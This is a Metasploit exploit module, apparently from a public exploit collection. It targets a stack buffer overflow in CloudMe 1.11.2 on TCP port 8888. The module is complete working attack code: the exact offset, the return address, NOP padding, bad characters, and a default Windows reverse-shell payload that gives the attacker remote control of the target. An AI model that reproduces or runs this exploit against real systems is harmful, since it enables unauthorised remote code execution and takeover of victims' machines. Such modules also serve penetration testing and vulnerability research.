##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CloudMe 1.11.2 BuffOverFlow',
      'Description'    => %q(
        This is a metasploit fork of Andy Bowden's python PoC.
        Cloud 1.11.2 is vulnerable to a Buff overflow conidition
        allowing an attacker to take over ret addr.
        Tested on: 
        Windows7 Pro x64
        Windows7 Pro x86
      ),
      'License'        => MSF_LICENSE,
      'Author'         => [
                            'Andy Bowden',      # original python author
                            'BashSTuff'         # msf module
                          ],
      'References'     =>
        [          
          [ 'URL', 'https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/',],
          [ 'URL', 'https://www.exploit-db.com/exploits/48389',],
        ],
      'DefaultOptions' =>
        {
          'PAYLOAD'  => 'windows/shell/reverse_tcp',
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'   => '\x00\x0A\x0D',
        },
      'Targets'        =>
        [
          [ 'CloudMe v1.11.2',
            {
              'Offset'  => 1052,
              'Ret'     => 0x68a842b5,
              'Padding' => 30
            }
          ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Apr 27 2020',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(8888)])

  end

  def exploit
    connect

    buffer  = "\x90" * (target['Offset'])
    buffer << [target['Ret']].pack('V')
    buffer << "\x90" * (target['Padding'])
    buffer << payload.encoded
    
    sock.put(buffer)
    handler
  end
  
end
